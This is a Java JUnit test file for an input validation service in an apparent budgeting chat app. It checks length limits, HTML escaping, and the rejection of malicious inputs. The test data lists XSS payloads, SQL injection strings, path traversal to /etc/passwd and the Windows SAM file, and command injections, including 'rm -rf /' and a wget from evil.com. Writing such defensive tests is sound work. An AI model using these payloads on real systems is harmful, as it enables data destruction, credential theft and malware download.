package com.backend.appvengers.service;

import com.backend.appvengers.service.InputValidationService.ValidationResult;
import org.junit.jupiter.api.BeforeEach;
import org.junit.jupiter.api.DisplayName;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.params.ParameterizedTest;
import org.junit.jupiter.params.provider.ValueSource;

import static org.assertj.core.api.Assertions.assertThat;

/**
 * Unit tests for InputValidationService.
 * Tests input validation, sanitization, and malicious pattern detection.
 */
class InputValidationServiceTest {

    private InputValidationService inputValidationService;

    @BeforeEach
    void setUp() {
        inputValidationService = new InputValidationService();
    }

    // ==================== Valid Input Tests ====================

    @Test
    @DisplayName("Should accept valid simple message")
    void shouldAcceptValidSimpleMessage() {
        ValidationResult result = inputValidationService.validateAndSanitize("Hello, how are you?");
        
        assertThat(result.isValid()).isTrue();
        assertThat(result.getErrorMessage()).isNull();
        assertThat(result.getSanitizedInput()).isNotBlank();
    }

    @Test
    @DisplayName("Should accept message at max length boundary")
    void shouldAcceptMessageAtMaxLength() {
        String message = "a".repeat(500); // Exactly 500 characters
        
        ValidationResult result = inputValidationService.validateAndSanitize(message);
        
        assertThat(result.isValid()).isTrue();
    }

    @Test
    @DisplayName("Should trim whitespace from message")
    void shouldTrimWhitespace() {
        ValidationResult result = inputValidationService.validateAndSanitize("   Hello World   ");
        
        assertThat(result.isValid()).isTrue();
        assertThat(result.getSanitizedInput()).doesNotStartWith(" ");
        assertThat(result.getSanitizedInput()).doesNotEndWith(" ");
    }

    @Test
    @DisplayName("Should normalize multiple spaces")
    void shouldNormalizeMultipleSpaces() {
        ValidationResult result = inputValidationService.validateAndSanitize("Hello    World");
        
        assertThat(result.isValid()).isTrue();
        assertThat(result.getSanitizedInput()).doesNotContain("  ");
    }

    // ==================== Invalid Input Tests ====================

    @Test
    @DisplayName("Should reject null message")
    void shouldRejectNullMessage() {
        ValidationResult result = inputValidationService.validateAndSanitize(null);
        
        assertThat(result.isValid()).isFalse();
        assertThat(result.getErrorMessage()).contains("empty");
    }

    @Test
    @DisplayName("Should reject empty message")
    void shouldRejectEmptyMessage() {
        ValidationResult result = inputValidationService.validateAndSanitize("");
        
        assertThat(result.isValid()).isFalse();
        assertThat(result.getErrorMessage()).contains("empty");
    }

    @Test
    @DisplayName("Should reject whitespace-only message")
    void shouldRejectWhitespaceOnlyMessage() {
        ValidationResult result = inputValidationService.validateAndSanitize("   ");
        
        assertThat(result.isValid()).isFalse();
        assertThat(result.getErrorMessage()).contains("empty");
    }

    @Test
    @DisplayName("Should reject message exceeding max length")
    void shouldRejectMessageExceedingMaxLength() {
        String message = "a".repeat(501); // 501 characters (exceeds 500 limit)
        
        ValidationResult result = inputValidationService.validateAndSanitize(message);
        
        assertThat(result.isValid()).isFalse();
        assertThat(result.getErrorMessage()).contains("too long");
    }

    // ==================== XSS Attack Prevention Tests ====================

    @ParameterizedTest
    @DisplayName("Should block script injection attempts")
    @ValueSource(strings = {
        "<script>alert('XSS')</script>",
        "<SCRIPT>alert('XSS')</SCRIPT>",
        "<script src='evil.js'></script>",
        "javascript:alert('XSS')",
        "onclick=alert('XSS')",
        "onerror=alert('XSS')",
        "onload=alert('XSS')"
    })
    void shouldBlockScriptInjection(String maliciousInput) {
        ValidationResult result = inputValidationService.validateAndSanitize(maliciousInput);
        
        assertThat(result.isValid()).isFalse();
        assertThat(result.getErrorMessage()).contains("unsafe");
    }

    @Test
    @DisplayName("Should block data URI XSS")
    void shouldBlockDataUriXss() {
        String input = "data:text/html,<script>alert('XSS')</script>";
        
        ValidationResult result = inputValidationService.validateAndSanitize(input);
        
        assertThat(result.isValid()).isFalse();
    }

    // ==================== SQL Injection Prevention Tests ====================

    @ParameterizedTest
    @DisplayName("Should block SQL injection attempts")
    @ValueSource(strings = {
        "'; DROP TABLE users; --",
        "' OR 1=1 --",
        "' AND 1=1 --",
        "'; DELETE FROM budgets; --",
        "'; UPDATE users SET role='admin'; --"
    })
    void shouldBlockSqlInjection(String maliciousInput) {
        ValidationResult result = inputValidationService.validateAndSanitize(maliciousInput);
        
        assertThat(result.isValid()).isFalse();
        assertThat(result.getErrorMessage()).contains("unsafe");
    }

    // ==================== Command Injection Prevention Tests ====================

    @ParameterizedTest
    @DisplayName("Should block command injection attempts")
    @ValueSource(strings = {
        "$(cat /etc/passwd)",
        "`rm -rf /`",
        "| cat /etc/passwd",
        "| ls -la",
        "| wget evil.com/malware.sh"
    })
    void shouldBlockCommandInjection(String maliciousInput) {
        ValidationResult result = inputValidationService.validateAndSanitize(maliciousInput);
        
        assertThat(result.isValid()).isFalse();
    }

    // ==================== Path Traversal Prevention Tests ====================

    @ParameterizedTest
    @DisplayName("Should block path traversal attempts")
    @ValueSource(strings = {
        "../../../etc/passwd",
        "..\\..\\..\\windows\\system32\\config\\sam"
    })
    void shouldBlockPathTraversal(String maliciousInput) {
        ValidationResult result = inputValidationService.validateAndSanitize(maliciousInput);
        
        assertThat(result.isValid()).isFalse();
    }

    // ==================== HTML Sanitization Tests ====================

    @Test
    @DisplayName("Should escape HTML entities in valid input")
    void shouldEscapeHtmlEntities() {
        // This is a valid message with HTML-like characters that should be escaped
        String input = "5 < 10 and 10 > 5";
        
        ValidationResult result = inputValidationService.validateAndSanitize(input);
        
        assertThat(result.isValid()).isTrue();
        assertThat(result.getSanitizedInput()).contains("&lt;");
        assertThat(result.getSanitizedInput()).contains("&gt;");
    }

    @Test
    @DisplayName("Should escape quotes in valid input")
    void shouldEscapeQuotes() {
        String input = "What's the budget for \"Food\"?";
        
        ValidationResult result = inputValidationService.validateAndSanitize(input);
        
        assertThat(result.isValid()).isTrue();
        assertThat(result.getSanitizedInput()).contains("&#x27;"); // Escaped single quote
        assertThat(result.getSanitizedInput()).contains("&quot;"); // Escaped double quote
    }

    // ==================== Edge Cases ====================

    @Test
    @DisplayName("Should accept messages with emojis")
    void shouldAcceptMessagesWithEmojis() {
        ValidationResult result = inputValidationService.validateAndSanitize("Hello! 👋 How's my budget? 💰");
        
        assertThat(result.isValid()).isTrue();
    }

    @Test
    @DisplayName("Should accept messages with numbers and symbols")
    void shouldAcceptMessagesWithNumbersAndSymbols() {
        ValidationResult result = inputValidationService.validateAndSanitize("My budget is $500.00 for groceries!");
        
        assertThat(result.isValid()).isTrue();
    }

    @Test
    @DisplayName("Should accept questions about budget")
    void shouldAcceptBudgetQuestions() {
        ValidationResult result = inputValidationService.validateAndSanitize(
            "What's my spending on Food category this month?"
        );
        
        assertThat(result.isValid()).isTrue();
    }
}
